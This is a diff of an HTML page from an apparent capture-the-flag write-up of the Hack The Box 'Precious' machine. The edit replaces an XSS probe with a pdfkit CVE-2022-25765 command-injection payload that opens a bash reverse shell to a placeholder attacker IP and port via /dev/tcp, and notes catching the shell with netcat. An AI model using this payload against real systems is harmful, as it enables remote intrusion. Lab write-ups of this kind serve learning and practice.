@@ -108,22 +108,17 @@
             <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS3.png" alt="website" class="center">
             <br>
             <br>
-            <p> pdkit v0.8.6 </p>
-            <br>
-            <img src="/Website/writeups/CSRv2022/media/PDFCARNAGECONSOLE.png" alt="website" class="center">
-            <br>
-            <p>wkhtmltopdf? Never heared of it. Searching github I found its repository: &nbsp <a href="https://github.com/wkhtmltopdf/wkhtmltopdf">https://github.com/wkhtmltopdf/wkhtmltopdf</a>
-            </p>
-            <p>Checked the version for vulnerabilitys and took a look at some security reports where I found a link to an interesting Blogpost about XSS that could lead to SSRF and further exploitation. &nbsp <a href="https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently">https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently</a>
-            </p>
-            <p>Yeah, dont want to read everything in detail now, I wanna try this by myself...</p>
+            <p> pdkit v0.8.6
+            <br> Checked the version and found out that it isnt the most up to date!
+            <br> Scrapping GitHub I saw a few posts about the changes since then and finally found a vulnerability that could be exploitable. </p>
             <br>
             <br>
             <p>
-            <h3>== Where is the vulnerabilitys? What about the promised XSS? ==</h3>
+            <h3>== CVE-2022-25765 ==</h3>
             </p>
-            <p>So first lets put in a basic XSS command to check wether this is a thing or not. <p-js>&lt;script>document.alert(1)&lt;/script></p-js>
-            </p>
+            <p>This vulernability is about Command Injection as the URL is not properly sanitized.
+            <br>Found an&nbsp <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">PoC</a> on snyk's Website. And came up with following Payload:  <p-js> http://example.com/?name=#{'%20`bash -c "/bin/bash -i >&amp; /dev/tcp/[ATTACKER IP]/[PORT] 0>&amp;1"`'} </p-js>
+            <br>Spun up a netcat listener and catched a reverse shell! </p>
             <br>
             <img src="/Website/writeups/CSRv2022/media/PDFCARNAGEINPUTFILTER.png" alt="website" class="center">
             <br>
